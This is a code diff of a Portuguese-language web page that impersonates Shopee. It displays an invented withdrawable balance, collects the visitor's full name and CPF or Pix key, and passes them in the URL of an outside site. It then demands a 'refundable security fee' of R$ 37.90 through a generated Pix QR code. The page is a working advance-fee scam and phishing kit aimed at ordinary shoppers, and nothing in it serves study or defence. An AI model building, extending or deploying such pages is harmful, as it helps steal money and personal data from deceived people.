@@ -10,192 +10,113 @@
         body { font-family: 'Roboto', sans-serif; background: #f5f5f5; margin: 0; padding: 0; color: #333; min-height: 100vh; overflow-x: hidden; }
         .hidden { display: none !important; }
 
-        /* --- TELA 1: SALDO --- */
-        .header-section { 
-            background: #ee4d2d; 
-            padding: 45px 20px 30px 20px; 
-            color: white; 
-            border-bottom-left-radius: 25px; 
-            border-bottom-right-radius: 25px; 
-            box-shadow: 0 4px 10px rgba(238, 77, 45, 0.3); 
-        }
+        /* HEADER LARANJA */
+        .header-section { background: #ee4d2d; padding: 45px 20px 30px 20px; color: white; border-bottom-left-radius: 25px; border-bottom-right-radius: 25px; box-shadow: 0 4px 10px rgba(238, 77, 45, 0.3); }
         .header-top { display: flex; justify-content: space-between; align-items: flex-start; }
         .coin-icon { width: 48px; height: 48px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2)); }
         
         .card-white { background: white; margin: 15px; padding: 20px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
 
         .option-group { display: flex; gap: 10px; margin: 15px 0; }
-        .option-btn { border: 1px solid #f0f0f0; background: #f9f9f9; padding: 12px 0; border-radius: 8px; text-align: center; font-weight: 700; flex: 1; color: #555; transition: 0.2s; cursor: pointer; }
+        .option-btn { border: 1px solid #f0f0f0; background: #f9f9f9; padding: 12px 0; border-radius: 8px; text-align: center; font-weight: 700; flex: 1; color: #555; transition: 0.2s; }
         .big-option { width: 100%; padding: 20px 0; font-size: 26px; font-weight: 900; border: 1px solid #f0f0f0; border-radius: 8px; text-align: center; background: #f9f9f9; cursor: pointer; color: #333; }
-        .selected { border: 2px solid #ee4d2d !important; background: #fff !important; color: #ee4d2d !important; position: relative; }
+        .selected { border: 2px solid #ee4d2d !important; background: #fff !important; color: #ee4d2d !important; }
 
-        .btn-main { background: #ee4d2d; color: white; width: 100%; padding: 16px; border: none; border-radius: 8px; font-size: 16px; font-weight: 800; text-transform: uppercase; cursor: pointer; box-shadow: 0 4px 6px rgba(238, 77, 45, 0.2); transition: 0.2s; }
-        .btn-main:active { transform: scale(0.98); }
-        .btn-disabled { background: #e0e0e0; color: #aaa; cursor: not-allowed; box-shadow: none; }
+        .btn-main { background: #ee4d2d; color: white; width: 100%; padding: 16px; border: none; border-radius: 8px; font-size: 16px; font-weight: 800; text-transform: uppercase; cursor: pointer; transition: 0.2s; }
+        .btn-disabled { background: #e0e0e0; color: #aaa; cursor: not-allowed; }
 
+        /* FOOTER SACOLA GRANDE */
         .shopee-footer { display: flex; align-items: center; justify-content: space-between; padding-top: 5px; }
         .shopee-desc { flex: 1; margin-right: 10px; }
-        .shopee-desc h4 { margin: 0 0 4px 0; font-size: 14px; font-weight: 800; color: #333; }
+        .shopee-desc h4 { margin: 0 0 4px 0; font-size: 14px; font-weight: 800; }
         .shopee-desc p { margin: 0; font-size: 11px; line-height: 1.4; color: #666; }
-        
-        .bag-icon-svg { 
-            width: 75px;
-            height: 75px; 
-            flex-shrink: 0;
-        }
+        .bag-icon-svg { width: 75px; height: 75px; flex-shrink: 0; }
 
-        /* --- MODAIS --- */
+        /* MODAIS E VSL */
         .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 200; display: flex; align-items: flex-end; backdrop-filter: blur(2px); }
-        .modal-sheet { background: white; width: 100%; border-radius: 20px 20px 0 0; padding: 30px 25px; animation: slideUp 0.3s cubic-bezier(0.16, 1, 0.3, 1); box-shadow: 0 -4px 20px rgba(0,0,0,0.1); }
+        .modal-sheet { background: white; width: 100%; border-radius: 20px 20px 0 0; padding: 30px 25px; animation: slideUp 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
         @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
         
         label { font-size: 13px; font-weight: 700; color: #444; margin-bottom: 8px; display: block; margin-top: 15px; }
         input, select { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; background: #f9f9f9; outline: none; }
-        input:focus, select:focus { border-color: #ee4d2d; background: #fff; }
-
-        /* --- TELA 3: CONFIRMAÇÃO --- */
-        .screen-container { background: #f5f5f5; min-height: 100vh; position: relative; }
-        .confirm-card { background: white; margin: 15px; padding: 20px; border-radius: 12px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
-        .tax-row { display: flex; align-items: center; gap: 10px; margin: 10px 0; }
-        .badge-refund { background: #e0f2f1; color: #00796b; font-size: 10px; font-weight: 700; padding: 4px 8px; border-radius: 4px; text-transform: uppercase; }
         
-        .data-list { background: #fafafa; padding: 15px; border-radius: 8px; margin-top: 15px; border: 1px solid #eee; }
-        .d-row { display: flex; justify-content: space-between; font-size: 13px; padding: 8px 0; border-bottom: 1px solid #eee; }
-        .d-row:last-child { border-bottom: none; font-weight: 700; font-size: 15px; color: #ee4d2d; }
-
-        /* --- TELA 4: VSL --- */
+        /* TELA VSL */
         .vsl-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 150; display: flex; flex-direction: column; }
         .vsl-frame { flex: 1; width: 100%; border: none; }
-        .vsl-footer-btn { padding: 15px 20px; background: white; border-top: 1px solid #eee; box-shadow: 0 -2px 10px rgba(0,0,0,0.1); z-index: 160; }
-
-        /* --- MODAL QR CODE --- */
-        .qr-box { background: white; padding: 25px; border-radius: 15px; width: 90%; max-width: 340px; margin: auto; text-align: center; position: relative; }
-        .pix-area { background: #f5f5f5; padding: 10px; border-radius: 6px; font-size: 11px; word-break: break-all; margin: 15px 0; max-height: 80px; overflow-y: auto; border: 1px dashed #ccc; }
+        .vsl-footer-btn { padding: 15px 20px; background: white; border-top: 1px solid #eee; z-index: 160; }
         
-        /* Loading spinner */
-        .spinner { 
-            border: 3px solid #f3f3f3; 
-            border-top: 3px solid #ee4d2d; 
-            border-radius: 50%; 
-            width: 20px; 
-            height: 20px; 
-            animation: spin 1s linear infinite; 
-            display: inline-block; 
-            margin-right: 8px; 
-            vertical-align: middle;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* TELA CONFIRMAÇÃO */
+        .screen-container { background: #f5f5f5; min-height: 100vh; padding: 20px; }
+        .confirm-card { background: white; padding: 20px; border-radius: 12px; margin-top: 15px; }
+        .tax-row { display: flex; align-items: center; gap: 10px; margin: 10px 0; }
+        .badge-refund { background: #e0f2f1; color: #00796b; font-size: 10px; font-weight: 700; padding: 4px 8px; border-radius: 4px; text-transform: uppercase; }
+        .data-list { background: #fafafa; padding: 15px; border-radius: 8px; margin-top: 15px; border: 1px solid #eee; }
+        .d-row { display: flex; justify-content: space-between; font-size: 13px; padding: 8px 0; border-bottom: 1px solid #eee; }
+        
+        /* QR CODE */
+        .qr-box { background: white; padding: 25px; border-radius: 15px; width: 90%; max-width: 340px; margin: auto; text-align: center; }
+        .pix-area { background: #f5f5f5; padding: 10px; border-radius: 6px; font-size: 11px; word-break: break-all; margin: 15px 0; max-height: 80px; overflow-y: auto; border: 1px dashed #ccc; width:100%; }
     </style>
 </head>
 <body>
 
-    <!-- TELA 1: SALDO -->
     <div id="screen-1">
         <div class="header-section">
             <div class="header-top">
-                <div>
-                    <span style="font-size: 14px; opacity: 0.9;">Seu saldo disponível</span>
-                    <div style="font-size: 42px; font-weight: 900; line-height: 1.2;">R$ <span id="balance">0,00</span></div>
-                    <div style="font-size: 12px; opacity: 0.8;">= <span id="points">0,00</span> pontos Shopee</div>
-                </div>
-                <div class="coin-icon">
-                    <svg viewBox="0 0 512 512"><circle cx="256" cy="256" r="248" fill="#ffd700" stroke="#daa520" stroke-width="8"/><text x="50%" y="65%" text-anchor="middle" fill="#daa520" font-family="Arial" font-weight="bold" font-size="250">$</text></svg>
-                </div>
+                <div><span style="font-size: 14px; opacity: 0.9;">Seu saldo disponível</span><div style="font-size: 42px; font-weight: 900;">R$ <span id="balance">0,00</span></div><div style="font-size: 12px; opacity: 0.8;">= <span id="points">0,00</span> pontos Shopee</div></div>
+                <div class="coin-icon"><svg viewBox="0 0 512 512"><circle cx="256" cy="256" r="248" fill="#ffd700" stroke="#daa520" stroke-width="8"/><text x="50%" y="65%" text-anchor="middle" fill="#daa520" font-family="Arial" font-weight="bold" font-size="250">$</text></svg></div>
             </div>
-            <div style="font-size: 12px; margin-top: 15px; border-top: 1px solid rgba(255,255,255,0.2); padding-top: 10px; opacity: 0.9;">
-                Última bonificação recebida: <strong>R$ 845,24</strong>
-            </div>
+            <div style="font-size: 12px; margin-top: 15px; border-top: 1px solid rgba(255,255,255,0.2); padding-top: 10px; opacity: 0.9;">Última bonificação recebida: <strong>R$ 845,24</strong></div>
         </div>
-
-        <div class="card-white" style="margin-top: 15px;">
-            <h3 style="margin: 0 0 15px 0; font-size: 16px; color: #333;">Solicitar Saque</h3>
-            <div style="display:flex; align-items:center; gap:8px; margin-bottom:15px; font-size:14px; color:#555;">
-                <span style="font-size: 18px;">💠</span> Transferência via <strong style="color:#00bfa5;">Pix</strong>
-            </div>
-            <div class="option-group">
-                <div class="option-btn" onclick="selectOpt(this)">R$1,5</div>
-                <div class="option-btn" onclick="selectOpt(this)">R$5</div>
-                <div class="option-btn" onclick="selectOpt(this)">R$10</div>
-            </div>
+        <div class="card-white">
+            <h3 style="margin: 0 0 15px 0; font-size: 16px;">Solicitar Saque</h3>
+            <div style="display:flex; align-items:center; gap:8px; margin-bottom:15px; font-size:14px; color:#555;"><span style="font-size: 18px;">💠</span> Transferência via <strong style="color:#00bfa5;">Pix</strong></div>
+            <div class="option-group"><div class="option-btn" onclick="selectOpt(this)">R$1,5</div><div class="option-btn" onclick="selectOpt(this)">R$5</div><div class="option-btn" onclick="selectOpt(this)">R$10</div></div>
             <div id="big-opt" class="big-option" onclick="selectBig()">R$ 1.489,38</div>
             <button id="btn-sacar" class="btn-main btn-disabled" onclick="openModalData()">SACAR AGORA</button>
             <p style="font-size:11px; color:#999; text-align:center; margin-top:12px;">Saldo mínimo para saque: R$ 1,50.</p>
         </div>
-
         <div class="card-white" style="margin-bottom: 30px;">
             <div class="shopee-footer">
-                <div class="shopee-desc">
-                    <h4>Acesso Exclusivo</h4>
-                    <p>Descubra todos os benefícios liberados para você. Conclua o acesso para aproveitar as vantagens de forma segura.</p>
-                </div>
-                
-                <svg class="bag-icon-svg" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M8 7V5C8 3.34315 9.34315 2 11 2H13C14.6569 2 16 3.34315 16 5V7" stroke="#EE4D2D" stroke-width="2" stroke-linecap="round"/>
-                    <rect x="4" y="7" width="16" height="15" rx="2" fill="#EE4D2D"/>
-                    <path d="M9 11C9 11 9.5 12 12 12C14.5 12 15 11 15 11" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
+                <div class="shopee-desc"><h4>Acesso Exclusivo</h4><p>Descubra todos os benefícios liberados para você.</p></div>
+                <svg class="bag-icon-svg" viewBox="0 0 24 24" fill="none"><path d="M8 7V5C8 3.34315 9.34315 2 11 2H13C14.6569 2 16 3.34315 16 5V7" stroke="#EE4D2D" stroke-width="2" stroke-linecap="round"/><rect x="4" y="7" width="16" height="15" rx="2" fill="#EE4D2D"/><path d="M9 11C9 11 9.5 12 12 12C14.5 12 15 11 15 11" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
             </div>
         </div>
     </div>
 
-    <!-- MODAL DADOS -->
     <div id="modal-data" class="modal-overlay hidden">
         <div class="modal-sheet">
-            <h2 style="text-align:center; font-size:18px; margin:0 0 20px 0; color:#333;">Dados para Recebimento</h2>
-            <label>Nome Completo</label>
-            <input type="text" id="input-nome" placeholder="Nome do titular da conta">
-            <label>Tipo de Chave Pix</label>
-            <select id="input-tipo" onchange="maskKey()">
-                <option value="cpf">CPF</option>
-                <option value="phone">Celular</option>
-                <option value="email">E-mail</option>
-                <option value="random">Chave Aleatória</option>
-            </select>
-            <label>Chave Pix</label>
-            <input type="tel" id="input-chave" placeholder="000.000.000-00">
-            <button class="btn-main" style="margin-top:25px;" onclick="goToConfirm()">CONTINUAR PARA PAGAMENTO</button>
-            <div style="text-align:center; font-size:11px; color:#999; margin-top:15px; display:flex; justify-content:center; gap:5px;">🔒 Ambiente Seguro Shopee Pay</div>
+            <h2 style="text-align:center; font-size:18px; margin:0 0 20px 0;">Dados para Recebimento</h2>
+            <label>Nome Completo</label><input type="text" id="input-nome" placeholder="Nome do titular">
+            <label>Tipo de Chave</label><select id="input-tipo" onchange="maskKey()"><option value="cpf">CPF</option><option value="email">E-mail</option><option value="random">Aleatória</option></select>
+            <label>Chave Pix</label><input type="tel" id="input-chave" placeholder="000.000.000-00">
+            <button class="btn-main" style="margin-top:25px;" onclick="goToConfirm()">CONTINUAR</button>
         </div>
     </div>
 
-    <!-- TELA CONFIRMAÇÃO -->
     <div id="screen-confirm" class="screen-container hidden">
-        <div style="padding: 20px;">
-            <div style="font-size:28px; font-weight:900; color:#333;">R$ 1.489,38</div>
-            <p style="font-size:13px; color:#777; margin:0 0 20px 0;">Saldo retido aguardando liberação</p>
-            <div class="confirm-card">
-                <h4 style="margin:0; font-size:14px; text-transform:uppercase; color:#555;">Taxa de Segurança</h4>
-                <div class="tax-row">
-                    <span style="font-size:26px; font-weight:800; color:#d32f2f;">R$ 37,90</span>
-                    <span class="badge-refund">Reembolsável</span>
-                </div>
-                <p style="font-size:13px; color:#666; line-height:1.4; margin:0;">Para evitar fraudes, é necessário confirmar sua identidade. O valor de <strong>R$ 37,90</strong> retornará para sua conta junto com o saldo total.</p>
-                <div class="data-list">
-                    <div style="font-size:10px; font-weight:700; color:#aaa; margin-bottom:8px; text-transform:uppercase;">Destino do Saque</div>
-                    <div class="d-row"><span style="color:#777;">Nome</span><span style="font-weight:600;" id="txt-nome">...</span></div>
-                    <div class="d-row"><span style="color:#777;">Chave Pix</span><span style="font-weight:600;" id="txt-chave">...</span></div>
-                    <div class="d-row"><span>Valor Total</span><span>R$ 1.489,38</span></div>
-                </div>
+        <div style="font-size:28px; font-weight:900; color:#333;">R$ 1.489,38</div>
+        <div class="confirm-card">
+            <div class="tax-row"><span style="font-size:26px; font-weight:800; color:#d32f2f;">R$ 37,90</span><span class="badge-refund">Reembolsável</span></div>
+            <p style="font-size:13px; color:#666;">Taxa de segurança para liberar o saldo total.</p>
+            <div class="data-list">
+                <div class="d-row"><span style="color:#777;">Nome</span><span style="font-weight:600;" id="txt-nome">...</span></div>
+                <div class="d-row"><span style="color:#777;">Chave Pix</span><span style="font-weight:600;" id="txt-chave">...</span></div>
             </div>
-            <button class="btn-main" onclick="goToVSL()" style="margin-top:10px;">LIBERAR SAQUE AGORA</button>
         </div>
+        <button class="btn-main" onclick="goToVSL()" style="margin-top:10px;">LIBERAR SAQUE</button>
     </div>
 
-    <!-- TELA VSL -->
     <div id="screen-vsl" class="vsl-container hidden">
         <iframe class="vsl-frame" src="https://recuperabonushopp.com/elementor-1623"></iframe>
-        <div class="vsl-footer-btn">
-            <button id="btn-final" class="btn-main" onclick="gerarPixAPI()">PAGAR TAXA E RECEBER SALDO</button>
-        </div>
+        <div class="vsl-footer-btn"><button id="btn-final" class="btn-main" onclick="gerarPixAPI()">PAGAR TAXA E RECEBER SALDO</button></div>
     </div>
 
-    <!-- MODAL QR CODE -->
-    <div id="modal-qr" class="modal-overlay hidden" style="background: rgba(0,0,0,0.85); align-items:center;">
+    <div id="modal-qr" class="modal-overlay hidden" style="background:rgba(0,0,0,0.85); align-items:center;">
         <div class="qr-box">
-            <h3 style="margin-top:0; color:#333;">Pagamento via Pix</h3>
-            <p style="font-size:13px; color:#666; margin-bottom:15px;">Copie o código abaixo e pague no seu banco.</p>
-            <img id="qr-img" style="width:180px; height:180px; display:block; margin:0 auto; border:1px solid #eee; padding:5px;">
-            <div style="text-align:left; font-size:11px; font-weight:700; margin-top:15px; color:#555;">Copia e Cola:</div>
+            <h3 style="margin-top:0;">Pagamento Pix</h3>
+            <img id="qr-img" style="width:180px; height:180px; display:block; margin:0 auto; border:1px solid #eee;">
+            <div style="text-align:left; font-size:11px; font-weight:700; margin-top:15px;">Copia e Cola:</div>
             <textarea id="pix-copy" class="pix-area" readonly></textarea>
             <button class="btn-main" onclick="copyCode()">COPIAR CÓDIGO</button>
             <button onclick="document.getElementById('modal-qr').classList.add('hidden')" style="background:none; border:none; margin-top:10px; color:#999;">Fechar</button>
@@ -203,169 +124,61 @@
     </div>
 
     <script>
-        // ==========================================
-        // CONFIGURAÇÃO DA API (CORRIGIDO!)
-        // ==========================================
-        // Usa a mesma origem do site (funciona em localhost e produção)
-        const API_URL = window.location.origin;
-        
-        console.log("🌐 API URL:", API_URL); // Debug
+        // CONFIGURAÇÃO: Vazio para usar o próprio backend do Railway
+        const API = ""; 
 
-        // 1. Animação do saldo
-        function anim(id, val) {
-            let cur = 0, el = document.getElementById(id), step = val/40;
-            let t = setInterval(() => {
-                cur += step;
-                if(cur>=val) { 
-                    el.innerText = val.toLocaleString('pt-BR',{minimumFractionDigits:2}); 
-                    clearInterval(t); 
-                }
-                else el.innerText = cur.toLocaleString('pt-BR',{minimumFractionDigits:2});
-            }, 30);
-        }
-        
-        window.onload = () => { 
-            anim('balance', 1489.38); 
-            anim('points', 42583.05); 
-        };
+        function anim(id, val) { let cur=0, el=document.getElementById(id), step=val/40, t=setInterval(()=>{ cur+=step; if(cur>=val){ el.innerText=val.toLocaleString('pt-BR',{minimumFractionDigits:2}); clearInterval(t); }else el.innerText=cur.toLocaleString('pt-BR',{minimumFractionDigits:2}); },30); }
+        window.onload = () => { anim('balance', 1489.38); anim('points', 42583.05); };
 
-        // 2. Navegação
-        let sel = false;
-        function selectOpt(e) { 
-            document.querySelectorAll('.option-btn,.big-option').forEach(b=>b.classList.remove('selected')); 
-            e.classList.add('selected'); 
-            sel=true; 
-            document.getElementById('btn-sacar').classList.remove('btn-disabled'); 
-        }
+        let sel=false;
+        function selectOpt(e) { document.querySelectorAll('.option-btn,.big-option').forEach(b=>b.classList.remove('selected')); e.classList.add('selected'); sel=true; document.getElementById('btn-sacar').classList.remove('btn-disabled'); }
         function selectBig() { selectOpt(document.getElementById('big-opt')); }
         function openModalData() { if(sel) document.getElementById('modal-data').classList.remove('hidden'); }
 
-        // 3. Máscaras de input
-        function maskKey() {
-            let t = document.getElementById('input-tipo').value, i = document.getElementById('input-chave');
-            i.value=""; 
-            if(t==='cpf') { i.placeholder="000.000.000-00"; i.type="tel"; }
-            else if(t==='email') { i.placeholder="email@exemplo.com"; i.type="email"; }
-            else if(t==='phone') { i.placeholder="(11) 99999-9999"; i.type="tel"; }
-            else { i.placeholder="Chave Pix"; i.type="text"; }
-        }
-        
-        document.getElementById('input-chave').addEventListener('input', function(e){
-            let t = document.getElementById('input-tipo').value, v = e.target.value.replace(/\D/g,"");
-            if(t==='cpf') { 
-                v=v.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2"); 
-                e.target.value=v; 
-            }
-            else if(t==='phone') {
-                v=v.replace(/^(\d{2})(\d)/g,"($1) $2").replace(/(\d{5})(\d)/,"$1-$2");
-                e.target.value=v;
-            }
-        });
+        function maskKey() { let t=document.getElementById('input-tipo').value, i=document.getElementById('input-chave'); i.value=""; i.placeholder = (t==='cpf') ? "000.000.000-00" : "Chave Pix"; }
+        document.getElementById('input-chave').addEventListener('input', function(e){ if(document.getElementById('input-tipo').value==='cpf') e.target.value = e.target.value.replace(/\D/g,"").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2"); });
 
-        // 4. Ir para confirmação
         function goToConfirm() {
-            let n = document.getElementById('input-nome').value, 
-                c = document.getElementById('input-chave').value;
-            
-            if(n.length<3 || c.length<4) {
-                alert("Preencha corretamente todos os campos.");
-                return;
-            }
-            
-            document.getElementById('txt-nome').innerText = n;
-            document.getElementById('txt-chave').innerText = c;
-            
-            document.getElementById('modal-data').classList.add('hidden');
-            document.getElementById('screen-1').classList.add('hidden');
-            document.getElementById('screen-confirm').classList.remove('hidden');
-            window.scrollTo(0,0);
+            let n=document.getElementById('input-nome').value, c=document.getElementById('input-chave').value;
+            if(n.length<3 || c.length<4) return alert("Preencha corretamente.");
+            document.getElementById('txt-nome').innerText = n; document.getElementById('txt-chave').innerText = c;
+            document.getElementById('modal-data').classList.add('hidden'); document.getElementById('screen-1').classList.add('hidden'); document.getElementById('screen-confirm').classList.remove('hidden');
         }
 
-        // 5. Ir para VSL
         function goToVSL() {
-            let nome = document.getElementById('input-nome').value;
-            let cpf = document.getElementById('input-chave').value.replace(/\D/g, ''); 
-            if(!cpf) cpf = "00000000000"; 
-
-            const baseURL = "https://recuperabonushopp.com/elementor-1623";
-            const finalURL = `${baseURL}?nome=${encodeURIComponent(nome)}&cpf=${cpf}`;
-
-            document.querySelector('.vsl-frame').src = finalURL;
-            document.getElementById('screen-confirm').classList.add('hidden');
-            document.getElementById('screen-vsl').classList.remove('hidden');
+            let n=document.getElementById('input-nome').value, c=document.getElementById('input-chave').value.replace(/\D/g,'') || "00000000000";
+            document.querySelector('.vsl-frame').src = `https://recuperabonushopp.com/elementor-1623?nome=${encodeURIComponent(n)}&cpf=${c}`;
+            document.getElementById('screen-confirm').classList.add('hidden'); document.getElementById('screen-vsl').classList.remove('hidden');
         }
 
-        // ==========================================
-        // GERAR PIX (CORRIGIDO!)
-        // ==========================================
         async function gerarPixAPI() {
             let btn = document.getElementById('btn-final');
             let n = document.getElementById('input-nome').value;
-            let cpfRaw = document.getElementById('input-chave').value.replace(/\D/g, '');
+            let c = document.getElementById('input-chave').value.replace(/\D/g,'') || "00000000000";
             
-            if(!cpfRaw) cpfRaw = "00000000000";
-
-            // Estado de loading
-            btn.disabled = true; 
-            btn.innerHTML = '<span class="spinner"></span> Gerando QR Code...';
+            btn.disabled = true; btn.innerText = "GERANDO...";
 
             try {
-                console.log("📤 Enviando requisição para:", `${API_URL}/pix`);
-                
-                const response = await fetch(`${API_URL}/pix`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify({ 
-                        name: n, 
-                        cpf: cpfRaw, 
-                        amount: 37.90 
-                    })
+                // Chama a rota /pix no Railway
+                let res = await fetch(`${API}/pix`, {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({ name: n, cpf: c, amount: 37.90 })
                 });
-
-                console.log("📥 Status da resposta:", response.status);
-
-                // Verificar se a resposta foi OK
-                if (!response.ok) {
-                    const errorText = await response.text();
-                    console.error("❌ Erro HTTP:", response.status, errorText);
-                    throw new Error(`Erro ${response.status}: ${errorText || 'Falha na requisição'}`);
-                }
-
-                const data = await response.json();
-                console.log("✅ Dados recebidos:", data);
-
-                // Verificar se tem QR code
-                if(data.point_of_interaction && data.point_of_interaction.transaction_data) {
-                    let img = data.point_of_interaction.transaction_data.qr_code_base64;
-                    let code = data.point_of_interaction.transaction_data.qr_code;
-                    
+                let json = await res.json();
+                
+                if(res.ok && json.point_of_interaction) {
+                    let img = json.point_of_interaction.transaction_data.qr_code_base64;
+                    let code = json.point_of_interaction.transaction_data.qr_code;
                     document.getElementById('qr-img').src = `data:image/png;base64,${img}`;
                     document.getElementById('pix-copy').value = code;
                     document.getElementById('modal-qr').classList.remove('hidden');
                 } else {
-                    console.error("⚠️ Resposta sem QR code:", data);
-                    alert("Erro ao gerar Pix: resposta inválida do servidor");
+                    alert("Erro: " + (json.mensagem_mp || "Falha ao gerar Pix"));
                 }
-
-            } catch(error) {
-                console.error("💥 Erro completo:", error);
-                alert("Erro de conexão: " + error.message);
-            } finally {
-                // Restaurar botão
-                btn.disabled = false; 
-                btn.innerText = "PAGAR TAXA E RECEBER SALDO";
-            }
+            } catch(e) { alert("Erro de conexão."); }
+            btn.disabled = false; btn.innerText = "PAGAR TAXA E RECEBER SALDO";
         }
-
-        function copyCode() {
-            let t = document.getElementById('pix-copy');
-            t.select(); 
-            document.execCommand('copy'); 
-            alert("Código Pix copiado para a área de transferência!");
-        }
+        function copyCode() { document.getElementById('pix-copy').select(); document.execCommand('copy'); alert("Copiado!"); }
     </script>
 </body>
 </html>
